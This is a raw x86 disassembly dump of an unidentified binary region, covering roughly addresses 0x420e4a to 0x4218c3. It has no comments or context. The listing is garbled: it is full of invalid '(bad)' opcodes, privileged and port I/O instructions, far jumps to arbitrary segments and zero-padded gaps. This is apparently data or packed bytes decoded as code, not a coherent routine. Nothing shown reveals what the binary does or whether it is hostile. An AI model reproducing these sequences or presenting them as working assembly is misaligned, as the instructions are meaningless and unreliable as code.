  420e4a:	sub    esi,DWORD PTR [ebx+edi*2+0x1ad51413]
  420e51:	bound  esi,QWORD PTR [ebx]
  420e53:	(bad)  
  420e54:	lahf   
  420e55:	addr16 pop ecx
  420e57:	add    bh,BYTE PTR [ecx+0x69]
  420e5a:	or     cl,BYTE PTR [eax-0x32]
  420e5d:	xchg   esi,eax
  420e5e:	adc    al,0x72
  420e60:	xchg   edi,eax
  420e61:	int3   
  420e62:	mov    ch,0x33
  420e64:	pop    edi
  420e65:	stos   DWORD PTR es:[edi],eax
  420e66:	int    0xba
  420e68:	mov    al,0x8d
  420e6a:	add    BYTE PTR [ebp+0x3280ffbb],ah
  420e70:	or     esi,DWORD PTR [ebx]
  420e72:	mov    eax,0x9285df37
  420e77:	push   ss
  420e78:	xor    DWORD PTR [edi-0xd7ebc08],0xaaf70721
  420e82:	(bad)  
  420e83:	bound  esp,QWORD PTR [edi]
  420e85:	lfs    esp,FWORD PTR [edx+0x2]
  420e89:	sub    DWORD PTR [ecx],0x45
  420e8c:	scas   eax,DWORD PTR es:[edi]
  420e8d:	xchg   edi,eax
  420e8e:	lahf   
  420e8f:	retf   0x46c3
  420e92:	push   esp
  420e93:	xor    al,0x40
  420e95:	enter  0x4c78,0xdb
  420e99:	adc    al,0x37
  420e9b:	cmp    al,0xfa
  420e9d:	test   eax,0x34fffb88
  420ea2:	rcl    DWORD PTR fs:[edi+0x5e08f4fd],1
  420ea9:	nop
  420eaa:	cwde   
  420eab:	push   0x15b3adec
  420eb0:	enter  0x38c9,0x1c
  420eb4:	fcmovbe st,st(3)
  420eb6:	cmc    
  420eb7:	push   ss
  420eb8:	push   0x52
  420eba:	or     eax,0xc049344c
  420ebf:	adc    BYTE PTR [edi+0x6f48804],bl
  420ec5:	cmp    ebp,ecx
  420ec7:	xchg   dl,bh
  420ec9:	and    ebx,ebx
  420ecb:	inc    edx
  420ecc:	(bad)  
  420ecd:	rol    BYTE PTR [esi],cl
  420ecf:	ins    DWORD PTR es:[edi],dx
  420ed0:	mov    ebp,DWORD PTR [ebp-0x46]
  420ed3:	push   edi
  420ed4:	ss pushw ss
  420ed7:	mov    dl,0x1d
  420ed9:	test   eax,0xacfccdc5
  420ede:	jo     0x420ec6
  420ee0:	pop    ds
  420ee1:	loop   0x420f3a
  420ee3:	xchg   esp,eax
  420ee4:	scas   eax,DWORD PTR es:[edi]
  420ee5:	sub    edx,0x7c
  420ee8:	loopne 0x420f45
  420eea:	mov    BYTE PTR [eax-0x4d],0xfe
  420eee:	mov    DWORD PTR [ecx+0x7dd69ca5],eax
  420ef4:	inc    ecx
  420ef5:	push   ebx
  420ef6:	adc    BYTE PTR [ebx-0x14f99de9],ah
  420efc:	sub    DWORD PTR [esi-0x66dbc603],edx
  420f02:	in     eax,0xdd
  420f04:	aam    0x59
  420f06:	fld    QWORD PTR cs:[eax-0x23]
  420f0a:	test   al,0x20
  420f0c:	mov    cl,0xb9
  420f0e:	push   esi
  420f0f:	js     0x420eca
	...
  420f71:	add    BYTE PTR [eax],al
  420f73:	add    BYTE PTR [eax],ah
  420f75:	xchg   edi,eax
  420f76:	inc    edx
  420f77:	shl    edi,cl
  420f79:	xlat   BYTE PTR ds:[ebx]
  420f7a:	mov    cl,0xf7
  420f7c:	jg     0x420f6b
  420f7e:	or     esp,DWORD PTR [esi+0x5af68551]
  420f84:	xchg   ebx,eax
  420f85:	pop    edi
  420f86:	add    DWORD PTR [eax],eax
  420f88:	add    eax,0x9a000001
  420f8d:	(bad)  
  420f8e:	fcmovne st,st(1)
  420f90:	jnp    0x420fb2
  420f92:	sbb    BYTE PTR [ebx],0x71
  420f95:	push   ebx
  420f96:	sub    al,0x31
  420f98:	int3   
  420f99:	imul   esi,ebp,0x52c6af50
  420f9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420fa0:	and    ebx,ecx
  420fa2:	data16 js 0x420f3d
  420fa5:	inc    edi
  420fa6:	jns    0x420f70
  420fa8:	jnp    0x421015
  420faa:	sbb    BYTE PTR [edx],bl
  420fac:	add    BYTE PTR [eax-0x38],bl
  420faf:	or     al,dh
  420fb1:	inc    ebx
  420fb2:	mov    ebp,DWORD PTR [ebx]
  420fb4:	int3   
  420fb5:	or     BYTE PTR [ebp+0x275c9e4a],al
  420fbb:	(bad)  
  420fbc:	std    
  420fbd:	fcom   QWORD PTR [ecx]
  420fbf:	pusha  
  420fc0:	xchg   esi,eax
  420fc1:	cmp    DWORD PTR [esi+0x2d460cab],ecx
  420fc7:	dec    eax
  420fc8:	sti    
  420fc9:	jg     0x420f5f
  420fcb:	jl     0x420fde
  420fcd:	test   al,0xdb
  420fcf:	pop    ecx
  420fd0:	rol    BYTE PTR [edi-0x58306a79],0xfb
  420fd7:	xor    al,0xfd
  420fd9:	arpl   bp,si
  420fdb:	mov    WORD PTR [eax-0x42ff6904],es
  420fe1:	push   ds
  420fe2:	mov    BYTE PTR [esi+0x10d3ca3d],al
  420fe8:	stc    
  420fe9:	leave  
  420fea:	sbb    esp,0x2fdd07f8
  420ff0:	jp     0x420f98
  420ff2:	xor    ebp,DWORD PTR [edx]
  420ff4:	dec    esi
  420ff5:	adc    al,0xa7
  420ff7:	and    ebx,DWORD PTR [ecx-0x42b661e0]
  420ffd:	dec    edi
  420ffe:	jbe    0x421070
  421000:	shl    BYTE PTR ds:0x2920aea5,cl
  421006:	push   0xffffffd7
  421008:	lods   eax,DWORD PTR ds:[esi]
  421009:	ret    
  42100a:	call   0x9ce6:0x8ca1bd7d
  421011:	ins    DWORD PTR es:[edi],dx
  421012:	mov    DWORD PTR [ebx],ebp
  421014:	rcr    BYTE PTR [ebp+0x34],1
  421017:	leave  
  421018:	dec    esi
  421019:	loopne 0x421048
  42101b:	call   0x4be3bf8b
  421020:	ror    BYTE PTR [edx+0x31],0x17
  421024:	lds    esi,FWORD PTR [esi-0x15]
  421027:	lods   al,BYTE PTR ds:[esi]
  421028:	(bad)  
  42102a:	dec    ecx
  42102b:	fidivr WORD PTR [ebx]
  42102d:	ins    DWORD PTR es:[edi],dx
  42102e:	xchg   edi,eax
  42102f:	add    al,0xea
  421031:	mov    ds:0x6af6a134,al
  421036:	popa   
  421037:	test   DWORD PTR [edi-0x6f],esi
  42103a:	ror    ebx,cl
  42103c:	sbb    esp,edx
  42103e:	sub    eax,0x46e3ab75
  421043:	ja     0x42107e
  421045:	xor    eax,0x166876fc
  42104a:	inc    esp
  42104b:	xchg   edi,eax
  42104c:	jnp    0x42102e
  42104e:	mov    ds,WORD PTR [edx-0x62]
  421051:	adc    bl,ch
  421053:	arpl   bp,sp
  421055:	sub    eax,0xfecb99c2
  42105a:	sbb    al,0x14
  42105c:	stos   DWORD PTR es:[edi],eax
  42105d:	test   al,0xa
  42105f:	adc    BYTE PTR ds:0x42b1c32c,al
  421065:	mov    ch,0x97
  421067:	lock pop esp
  421069:	pop    ebp
  42106a:	adc    dh,cl
  42106c:	push   cs
  42106d:	(bad)  
  42106e:	(bad)  
  42106f:	(bad)  
  421070:	push   edx
  421071:	cli    
  421072:	pop    edi
  421073:	inc    edx
  421074:	bound  ecx,QWORD PTR [esi+0x42]
  421077:	inc    edi
  421078:	leave  
  421079:	xlat   BYTE PTR ds:[ebx]
  42107a:	sbb    esp,DWORD PTR [esi+esi*1+0x4d350cb4]
  421081:	fs mov esp,0x5d64cc2d
  421087:	add    ebx,eax
  421089:	dec    edx
  42108a:	adc    bl,BYTE PTR [eax+ebp*2-0x66c06e5f]
	...
  4210f1:	add    BYTE PTR [eax],al
  4210f3:	add    BYTE PTR [edi-0x243925a2],bl
  4210f9:	(bad)  
  4210fa:	lahf   
  4210fb:	pop    edi
  4210fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4210fd:	jne    0x4210e1
  4210ff:	mov    ?,WORD PTR [eax]
  421101:	call   0x1:0x6098fc6a
  421108:	add    eax,0x51000001
  42110d:	rol    DWORD PTR [esi],0x3b
  421110:	pop    edx
  421111:	in     eax,0xc8
  421113:	push   es
  421114:	cmc    
  421115:	iret   
  421116:	call   0x27b0:0x6133b9f6
  42111d:	dec    esi
  42111e:	popf   
  42111f:	ret    0x3ef9
  421122:	inc    edi
  421123:	loopne 0x4210c7
  421125:	rcl    DWORD PTR [ebx+ebx*4],0x3a
  421129:	ds push ds
  42112b:	dec    esp
  42112c:	cmp    DWORD PTR [edx+0x66],edi
  42112f:	pop    esi
  421130:	sti    
  421131:	jmp    0x4210ba
  421133:	dec    ebp
  421134:	dec    esi
  421135:	pop    ss
  421136:	fistp  DWORD PTR [ecx-0x7544ebec]
  42113c:	jno    0x421157
  42113e:	sbb    al,0xba
  421140:	mov    eax,0x85015874
  421145:	mov    eax,ds:0x28253936
  42114a:	leave  
  42114b:	(bad)  
  42114c:	in     eax,dx
  42114d:	mov    edx,0xfbb78715
  421152:	ins    BYTE PTR es:[edi],dx
  421153:	jmp    0xc188:0xad16f1ae
  42115a:	pop    ebp
  42115b:	aad    0x6b
  42115d:	inc    esi
  42115e:	and    ebp,DWORD PTR cs:[ebx+0x1900a639]
  421165:	scas   al,BYTE PTR es:[edi]
  421166:	jnp    0x421198
  421168:	sbb    eax,0xfca7cecc
  42116d:	int    0xc4
  42116f:	dec    ebp
  421170:	cld    
  421171:	stos   BYTE PTR es:[edi],al
  421172:	test   al,0x51
  421174:	je     0x421190
  421176:	and    esp,0x69
  421179:	and    ch,cl
  42117b:	sbb    ecx,edi
  42117d:	cld    
  42117e:	xchg   edi,eax
  42117f:	adc    al,0x58
  421181:	(bad)  
  421182:	sub    BYTE PTR [edx+0x26],cl
  421185:	jb     0x421192
  421187:	mov    DWORD PTR [ecx-0x4],ebx
  42118a:	aas    
  42118b:	push   eax
  42118c:	push   ds
  42118d:	lea    ecx,[esi]
  42118f:	(bad)  
  421190:	inc    ebx
  421191:	mov    cl,cl
  421193:	inc    edi
  421194:	mov    ebx,0x45005e4b
  421199:	fisttp DWORD PTR ds:0x10aefa13
  42119f:	adc    al,0x20
  4211a1:	xchg   esp,eax
  4211a2:	(bad)
  4211a5:	(bad)  
  4211a7:	jecxz  0x4211bf
  4211a9:	jecxz  0x4211b5
  4211ab:	in     al,0xe4
  4211ad:	sbb    DWORD PTR [esi-0x4afde511],edx
  4211b3:	mov    esp,0xad4724f3
  4211b8:	stos   DWORD PTR es:[edi],eax
  4211b9:	dec    bl
  4211bb:	jne    0x421194
  4211bd:	cs jo  0x42121a
  4211c0:	leave  
  4211c1:	test   eax,0x382c0f01
  4211c6:	loope  0x42119d
  4211c8:	fld    QWORD PTR [ecx]
  4211ca:	mov    dh,0x56
  4211cc:	xor    BYTE PTR [ebp+ecx*4+0x7f5f980],bh
  4211d3:	fmul   DWORD PTR [eax-0x412e90e7]
  4211d9:	xor    eax,0xa650e9d8
  4211de:	add    BYTE PTR [ecx+0x47],dl
  4211e1:	or     BYTE PTR [ebx-0x3b],dl
  4211e4:	test   ch,cl
  4211e6:	icebp  
  4211e7:	(bad)  
  4211e8:	sbb    BYTE PTR [esi-0x2903c50f],dh
  4211ee:	test   eax,0x6a3181c6
  4211f3:	cli    
  4211f4:	pop    ebp
  4211f5:	push   ecx
  4211f6:	rol    al,0xa5
  4211f9:	add    DWORD PTR [eax-0x95a3017],ecx
  4211ff:	mov    eax,esi
  421201:	or     ecx,ecx
  421203:	push   eax
  421204:	ret    
  421205:	or     eax,0x25a881c3
  42120a:	in     eax,dx
  42120b:	shl    ebx,cl
  42120d:	ja     0x421235
  42120f:	mov    cl,0x28
	...
  421271:	add    BYTE PTR [eax],al
  421273:	add    BYTE PTR [esi-0x700870e1],bl
  421279:	idiv   esi
  42127b:	jg     0x42123a
  42127d:	sub    eax,0x27937ab3
  421282:	mov    ah,0x35
  421284:	popf   
  421285:	popa   
  421286:	add    DWORD PTR [eax],eax
  421288:	add    eax,0xbb000001
  42128d:	push   esi
  42128e:	mov    ebp,0x6afb4eb6
  421293:	jb     0x421289
  421295:	pop    eax
  421296:	jge    0x421281
  421298:	call   0x1c2e9b60
  42129d:	or     ebp,DWORD PTR ds:0x29fd3013
  4212a3:	repnz xor DWORD PTR [ebx+0xf],ebp
  4212a7:	inc    ecx
  4212a8:	int3   
  4212a9:	data16 int3 
  4212ab:	sub    DWORD PTR fs:[eax+0x12577ed8],0xd9315142
  4212b6:	or     bl,BYTE PTR ss:[eax-0xa]
  4212ba:	lods   eax,DWORD PTR ds:[esi]
  4212bb:	mov    bh,0x52
  4212bd:	outs   dx,DWORD PTR ds:[esi]
  4212be:	icebp  
  4212bf:	fcomp  DWORD PTR [ebp-0x603a6e7d]
  4212c5:	add    al,0x1d
  4212c7:	std    
  4212c8:	jge    0x4212eb
  4212ca:	stc    
  4212cb:	xchg   ebx,eax
  4212cc:	push   ecx
  4212cd:	mov    ah,0x44
  4212cf:	arpl   bx,di
  4212d1:	mov    es,eax
  4212d3:	mov    eax,0x9b8bb27c
  4212d8:	test   BYTE PTR [edx],bh
  4212da:	ret    0xcd46
  4212dd:	stc    
  4212de:	imul   edi,ebp,0x5e
  4212e1:	mov    ds:0x55462b6e,eax
  4212e6:	pop    edx
  4212e7:	xchg   ebx,eax
  4212e8:	outs   dx,DWORD PTR ds:[esi]
  4212e9:	cli    
  4212ea:	jo     0x4212f3
  4212ec:	xor    esp,eax
  4212ee:	stos   BYTE PTR es:[edi],al
  4212ef:	and    al,0x10
  4212f1:	push   0x8fa61af
  4212f6:	lods   eax,DWORD PTR es:[esi]
  4212f8:	out    0xd1,eax
  4212fa:	(bad)  
  4212fb:	lahf   
  4212fc:	jae    0x4212bb
  4212fe:	(bad)  
  421300:	repz cmc 
  421302:	pop    eax
  421303:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421304:	mov    al,al
  421306:	ret    
  421307:	pusha  
  421308:	lods   al,BYTE PTR ds:[esi]
  421309:	push   ecx
  42130a:	inc    eax
  42130b:	adc    al,0x2b
  42130d:	mov    eax,0xadfa216
  421312:	lock sub eax,0xf2a0d891
  421318:	sbb    al,0x66
  42131a:	addr16 xchg ebp,eax
  42131c:	(bad)  
  42131d:	popa   
  42131e:	data16 int3 
  421320:	lods   al,BYTE PTR ds:[esi]
  421321:	mov    esp,0x6affe91
  421326:	jmp    0x6661:0xa23a9289
  42132d:	xor    al,0xc7
  42132f:	fwait
  421330:	push   ebx
  421331:	sbb    DWORD PTR [eax-0x4b],ebp
  421334:	jg     0x421315
  421336:	xlat   BYTE PTR ds:[ebx]
  421337:	cmp    dl,dl
  421339:	not    ebx
  42133b:	test   BYTE PTR [edi+0x4dac0c1c],dl
  421341:	aas    
  421342:	ss cld 
  421344:	cmp    al,0xd5
  421346:	jg     0x421368
  421348:	xor    al,0x3f
  42134a:	dec    esi
  42134b:	call   0x55e9ea0a
  421350:	jmp    0xf3ce0686
  421355:	outs   dx,BYTE PTR ds:[esi]
  421356:	push   cs
  421357:	add    eax,0x67d3973
  42135c:	mov    es,WORD PTR [esi]
  42135e:	repz aam 0x50
  421361:	iret   
  421362:	sub    al,ah
  421364:	ss cdq 
  421366:	inc    eax
  421367:	jb     0x4213cb
  421369:	aas    
  42136a:	mov    cl,0xdf
  42136c:	jecxz  0x421300
  42136e:	xchg   edx,eax
  42136f:	scas   al,BYTE PTR es:[edi]
  421370:	dec    edx
  421371:	es test eax,0x410906bb
  421377:	inc    ebx
  421378:	leave  
  421379:	mov    bl,0x4b
  42137b:	dec    eax
  42137c:	fild   DWORD PTR [edx+0x45]
  42137f:	xor    al,0x62
  421381:	mov    ss,WORD PTR [edi+0x759f4f44]
  421387:	shr    ch,0xc8
  42138a:	mov    es,WORD PTR ds:0x2c38984f
  421390:	xor    al,0x0
	...
  4213f2:	add    BYTE PTR [eax],al
  4213f4:	inc    bh
  4213f6:	pop    esp
  4213f7:	mov    eax,ds:0xdfffbb7d
  4213fc:	fstp   DWORD PTR [ebp+0x219bf49f]
  421402:	pop    esp
  421403:	fbld   TBYTE PTR [edx+0x5000162]
  421409:	add    DWORD PTR [eax],eax
  42140b:	add    BYTE PTR [edi],dh
  42140d:	and    bl,BYTE PTR [edi]
  42140f:	std    
  421410:	ret    
  421411:	mov    ebp,0x599d80ed
  421416:	dec    edi
  421417:	jae    0x42145e
  421419:	mov    cl,0x3a
  42141b:	xchg   edi,eax
  42141c:	sbb    BYTE PTR [ecx+ebp*2-0x7d1a7a97],cl
  421423:	hlt    
  421424:	inc    eax
  421425:	and    al,0xce
  421427:	cmp    al,0x5f
  421429:	xchg   DWORD PTR [edi-0x70625e59],ecx
  42142f:	dec    ebp
  421430:	pop    esi
  421431:	cmc    
  421432:	lds    ecx,FWORD PTR [edx+0x7b]
  421435:	pop    esp
  421436:	xchg   edx,eax
  421437:	mov    WORD PTR [ebx-0x57],gs
  42143a:	popaw  
  42143c:	(bad)  
  42143d:	gs push esi
  42143f:	outs   dx,BYTE PTR ds:[esi]
  421440:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  421442:	gs pop ecx
  421444:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421445:	mov    dh,0x62
  421447:	sbb    eax,0xa7e417e9
  42144c:	push   esi
  42144d:	cli    
  42144e:	cwde   
  42144f:	jge    0x421487
  421451:	div    DWORD PTR [eax+0x3d1bfb4f]
  421457:	xor    DWORD PTR ds:0x6c02a04d,0x3f
  42145e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42145f:	xchg   ebx,eax
  421460:	(bad)  [ebx+0x76]
  421463:	fadd   st,st(3)
  421465:	addr16 sub al,0x4a
  421468:	out    dx,eax
  421469:	xchg   edi,eax
  42146a:	in     eax,0xcf
  42146c:	add    eax,0xdbacc585
  421471:	test   ecx,edx
  421473:	repnz pop ebx
  421475:	mov    ah,0x94
  421477:	and    eax,0x161cecc4
  42147c:	outs   dx,DWORD PTR ds:[esi]
  42147d:	pushf  
  42147e:	adc    eax,0xc706acff
  421483:	outs   dx,DWORD PTR ds:[esi]
  421484:	xchg   esi,eax
  421485:	iret   
  421486:	and    eax,DWORD PTR [edx-0x79]
  421489:	push   cs
  42148a:	inc    esp
  42148b:	jecxz  0x4214cf
  42148d:	ret    
  42148e:	cwde   
  42148f:	mov    dl,bl
  421491:	addr16 mov ebp,0xc645e03e
  421497:	ds add eax,0x69328641
  42149d:	mov    cs,WORD PTR [ebx-0x5606a7d2]
  4214a3:	inc    edx
  4214a4:	add    eax,0xa4bf956
  4214a9:	sub    dh,BYTE PTR [esp+eax*2-0x669f0d3f]
  4214b0:	enter  0x9101,0x90
  4214b4:	or     BYTE PTR [ecx+0xa348e0b],dh
  4214ba:	adc    DWORD PTR [ebx+0x67],edi
  4214bd:	dec    al
  4214bf:	sbb    edx,esi
  4214c1:	(bad)  
  4214c2:	dec    edi
  4214c3:	jle    0x4214f8
  4214c5:	mov    esp,0x23142bcd
  4214ca:	jmp    0x2190:0x2f1162d5
  4214d1:	(bad)  
  4214d2:	cmp    ah,BYTE PTR [ebp-0x96ed2b4]
  4214d8:	sbb    BYTE PTR [edx],cl
  4214da:	aaa    
  4214db:	cmp    ebx,DWORD PTR [ebx+0x23]
  4214de:	dec    edx
  4214df:	push   esi
  4214e0:	xor    ecx,DWORD PTR [edi+0x6e]
  4214e3:	dec    eax
  4214e4:	or     eax,0x45d03841
  4214e9:	cmp    eax,esi
  4214eb:	jle    0x4214d0
  4214ed:	fbstp  TBYTE PTR [eax]
  4214ef:	stos   BYTE PTR es:[edi],al
  4214f0:	add    dh,ah
  4214f2:	in     al,0xdc
  4214f4:	scas   eax,DWORD PTR es:[edi]
  4214f5:	popa   
  4214f6:	out    0x4d,eax
  4214f8:	(bad)  
  4214f9:	and    eax,0x1c4cb138
  4214fe:	push   ebx
  4214ff:	ficomp WORD PTR [ebx+0x4c034ee7]
  421505:	mov    edi,0xa70bf913
  42150a:	inc    ebx
  42150b:	call   0x5fb3d91f
  421510:	push   es
	...
  421571:	add    BYTE PTR [eax],al
  421573:	add    dh,dl
  421575:	repnz test BYTE PTR [eax],bl
  421578:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421579:	jle    0x421559
  42157b:	(bad)  
  42157c:	arpl   WORD PTR [eax+0x1a7c42b4],bp
  421582:	outs   dx,DWORD PTR ds:[esi]
  421583:	ins    BYTE PTR es:[edi],dx
  421584:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421585:	arpl   WORD PTR [ecx],ax
  421587:	add    BYTE PTR ds:0xf0000001,al
  42158d:	or     eax,ecx
  42158f:	mov    edi,0xb156f6ab
  421594:	lea    edi,[edx-0x8eb58b2]
  42159a:	lock jecxz 0x4215fa
  42159d:	push   eax
  42159e:	mov    al,BYTE PTR [esi+eiz*4-0x29]
  4215a2:	pop    ss
  4215a3:	xor    al,0x15
  4215a5:	inc    esi
  4215a6:	es pop ds
  4215a8:	mov    ah,0x4f
  4215aa:	sub    DWORD PTR [eax+ecx*8],0xfffffff5
  4215ae:	lahf   
  4215af:	ret    0x9ce0
  4215b2:	sub    al,0x76
  4215b4:	fwait
  4215b5:	icebp  
  4215b6:	push   0xffffffa2
  4215b8:	pop    es
  4215b9:	dec    ebx
  4215ba:	mov    bl,0xae
  4215bc:	cli    
  4215bd:	mov    bh,0x52
  4215bf:	xor    eax,0x8f00e463
  4215c4:	fs in  al,dx
  4215c6:	stos   DWORD PTR es:[edi],eax
  4215c7:	nop
  4215c8:	sti    
  4215c9:	(bad)  
  4215ca:	cwde   
  4215cb:	mov    ch,0x5c
  4215cd:	push   ds
  4215ce:	jle    0x4215a7
  4215d0:	je     0x421650
  4215d2:	stc    
  4215d3:	jge    0x42157e
  4215d5:	out    0xe0,al
  4215d7:	js     0x4215e5
  4215d9:	mov    cl,0xb0
  4215db:	jbe    0x42161e
  4215dd:	inc    ebp
  4215de:	cmc    
  4215df:	jmp    ebx
  4215e1:	push   edi
  4215e2:	xchg   ebp,esp
  4215e4:	in     eax,dx
  4215e5:	ins    BYTE PTR es:[edi],dx
  4215e6:	out    0x35,al
  4215e8:	dec    edx
  4215e9:	dec    edi
  4215ea:	xchg   esi,eax
  4215eb:	stc    
  4215ec:	inc    ecx
  4215ed:	iret   
  4215ee:	addr16 inc esi
  4215f0:	mov    edx,0x4092e890
  4215f5:	(bad)  
  4215f7:	adc    DWORD PTR [esi-0x1ea58301],edx
  4215fd:	push   cs
  4215fe:	cmc    
  4215ff:	ja     0x4215e7
  421601:	jg     0x421661
  421603:	adc    DWORD PTR [edi],ecx
  421605:	test   eax,0x68184c99
  42160a:	pop    ecx
  42160b:	sahf   
  42160c:	pop    esp
  42160d:	jbe    0x4215ed
  42160f:	sub    al,0x37
  421611:	test   al,0xa4
  421613:	sti    
  421614:	popa   
  421615:	lea    edi,[eax+ebx*4-0x4d1733d9]
  42161c:	ja     0x42160a
  42161e:	jg     0x4215ac
  421620:	out    0x89,al
  421622:	xchg   DWORD PTR [ebx+edi*4-0x125ef81f],ebp
  421629:	retf   
  42162a:	rcr    DWORD PTR [ecx+0x66112cd9],0x70
  421631:	mov    edx,0x35e12fb3
  421636:	adc    al,0xda
  421638:	add    BYTE PTR [eax],bh
  42163a:	jp     0x4215fa
  42163c:	inc    ebp
  42163d:	ret    
  42163e:	js     0x421615
  421640:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421641:	xchg   BYTE PTR [ebx+ebx*4+0x40],bl
  421645:	not    BYTE PTR [esi+0x2c84194]
  42164b:	jae    0x421666
  42164d:	leave  
  42164e:	push   bx
  421650:	bound  edi,QWORD PTR [ebp+0x52f1e1b4]
  421656:	cld    
  421657:	cmc    
  421658:	cmp    esi,DWORD PTR ds:0x47f08f5a
  42165e:	or     ah,al
  421660:	and    DWORD PTR [ecx+0xe9f822d],ecx
  421666:	mov    ch,ch
  421668:	jo     0x4215ec
  42166a:	inc    eax
  42166b:	xor    dh,BYTE PTR [edi]
  42166d:	test   DWORD PTR [ebp+eiz*8-0x2b],esp
  421671:	mov    esp,0x89cf2855
  421676:	push   edx
  421677:	fcmovbe st,st(7)
  421679:	pop    ebp
  42167a:	adc    bh,BYTE PTR [edx+0x204d6b58]
  421680:	leave  
  421681:	aaa    
  421682:	jbe    0x4216c5
  421684:	jbe    0x42162a
  421686:	das    
  421687:	jge    0x4216ed
  421689:	and    cl,BYTE PTR [edx+0x16]
  42168c:	in     al,dx
  42168d:	jb     0x42164c
  42168f:	hlt    
  421690:	lock add BYTE PTR [eax],al
	...
  4216f3:	add    BYTE PTR [ebx-0x105512d4],ch
  4216f9:	jmp    0x4216ea
  4216fb:	sub    eax,0xa3418669
  421700:	rcr    BYTE PTR [edx+0x64acbc37],cl
  421706:	add    DWORD PTR [eax],eax
  421708:	add    eax,0xfc000001
  42170d:	dec    ebx
  42170e:	lahf   
  42170f:	jp     0x42169a
  421711:	fwait
  421712:	out    dx,al
  421713:	sub    al,0xb4
  421715:	adc    BYTE PTR [ecx-0x16],0x39
  421719:	jne    0x42177a
  42171b:	sbb    al,0x33
  42171d:	sub    al,0x6
  42171f:	mov    cl,0xcb
  421721:	imul   esp,esp,0xfffffff3
  421724:	jo     0x42175f
  421726:	adc    esp,DWORD PTR [ebx-0x1b]
  421729:	popf   
  42172a:	inc    edi
  42172b:	cdq    
  42172c:	jbe    0x421796
  42172e:	nop
  42172f:	call   0x3c3f:0x56be1dfa
  421736:	sbb    dh,BYTE PTR [esi-0x68]
  421739:	sbb    al,0xa
  42173b:	out    dx,al
  42173c:	icebp  
  42173d:	mov    fs,WORD PTR [esi]
  42173f:	out    dx,al
  421740:	add    DWORD PTR [edi+ebx*8],ebp
  421743:	or     cl,ah
  421745:	sub    bl,ch
  421747:	mov    al,0x8
  421749:	sub    al,0xe6
  42174b:	pop    ebp
  42174c:	(bad)  
  42174d:	std    
  42174e:	mov    es,WORD PTR [esi+eax*1+0x42]
  421752:	not    eax
  421754:	scas   al,BYTE PTR es:[edi]
  421755:	(bad)  
  421756:	xchg   ebx,eax
  421757:	jb     0x4217c3
  421759:	fbstp  TBYTE PTR [edx-0x20]
  42175c:	fisttp DWORD PTR [ecx+0x39]
  42175f:	retf   0x6c5f
  421762:	rol    BYTE PTR ss:[eax],cl
  421765:	push   edi
  421766:	or     al,0x50
  421768:	loope  0x421718
  42176a:	add    esi,edi
  42176c:	fist   DWORD PTR [edx]
  42176e:	add    al,BYTE PTR [edx+eax*2+0xa]
  421772:	lock int 0x18
  421775:	xchg   BYTE PTR [edx+0x760f91a2],cl
  42177b:	stos   BYTE PTR es:[edi],al
  42177c:	pusha  
  42177d:	dec    BYTE PTR [ebx-0x9]
  421780:	and    DWORD PTR [esi+0x6b8eb301],eax
  421786:	repnz mov al,ds:0x32dac0ff
  42178c:	or     dl,BYTE PTR [edi+0x10a5b012]
  421792:	aaa    
  421793:	adc    BYTE PTR [eax-0x348cbe8],al
  421799:	imul   edx,DWORD PTR [eax],0x20
  42179c:	fistp  WORD PTR ds:0x164c1998
  4217a2:	je     0x42175d
  4217a4:	inc    ebx
  4217a5:	add    dh,bl
  4217a7:	push   ebp
  4217a8:	sub    al,0x52
  4217aa:	out    dx,al
  4217ab:	imul   ebx,DWORD PTR [ebx+0x60af1610],0xc0819b74
  4217b5:	sahf   
  4217b6:	push   edi
  4217b7:	loop   0x42177c
  4217b9:	inc    edi
  4217ba:	rcr    BYTE PTR [eax+esi*8],1
  4217bd:	repz fmul st,st(3)
  4217c0:	outs   dx,DWORD PTR ds:[esi]
  4217c1:	push   esi
  4217c2:	mov    ds:0x35e69b13,al
  4217c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4217c8:	popa   
  4217c9:	adc    ebp,DWORD PTR [ecx]
  4217cb:	mov    esi,eax
  4217cd:	sbb    cl,BYTE PTR [ebp+0x2d73e255]
  4217d3:	shl    BYTE PTR [eax+0x58],cl
  4217d6:	(bad)  [ecx+eax*1]
  4217d9:	pushf  
  4217da:	(bad)  [edx-0x6725a372]
  4217e0:	(bad)  
  4217e1:	call   0x80da709f
  4217e6:	fnstsw WORD PTR ds:0x9e101e16
  4217ec:	push   ebx
  4217ed:	inc    esp
  4217ee:	je     0x421798
  4217f0:	in     al,dx
  4217f1:	dec    esi
  4217f2:	inc    esp
  4217f3:	aad    0xdf
  4217f5:	push   0xffffffa3
  4217f7:	aas    
  4217f8:	or     edx,edi
  4217fa:	fdiv   DWORD PTR [edi-0x2edc427b]
  421800:	(bad)  
  421801:	int3   
  421802:	or     ecx,DWORD PTR [ebx+edx*8+0x6f]
  421806:	fs pop es
  421808:	jb     0x42180d
  42180a:	fwait
  42180b:	push   esi
  42180c:	lock fstp st(6)
  42180f:	xchg   BYTE PTR [ecx+0x0],ch
	...
  421872:	add    BYTE PTR [eax],al
  421874:	shl    DWORD PTR [eax-0x6061f47],1
  42187a:	fnstenv [ecx-0x359a0174]
  421880:	inc    edi
  421881:	arpl   WORD PTR [esi*4+0x165b1],dx
  421888:	add    eax,0x7c000001
  42188d:	test   DWORD PTR [esi],0x5dd61bb7
  421893:	lods   al,BYTE PTR ds:[esi]
  421894:	mov    eax,0x2b4b2016
  421899:	retf   
  42189a:	dec    eax
  42189b:	lock inc edx
  42189d:	pop    ebp
  42189e:	inc    esp
  42189f:	fs adc al,0x74
  4218a2:	pop    es
  4218a3:	addr16 jmp 0x32c2:0xeb7e27ce
  4218ab:	dec    ebp
  4218ac:	mov    esi,ecx
  4218ae:	push   ss
  4218af:	add    al,0x38
  4218b1:	imul   eax,DWORD PTR [edx+ebp*8-0x6c],0x267fea94
  4218b9:	imul   esp,DWORD PTR [edx],0x6d1a77
  4218bf:	ret    
  4218c0:	jl     0x421855
  4218c2:	(bad)  
  4218c3:	shl    DWORD PTR [ecx+ecx*2-0x5c6ac32f],1
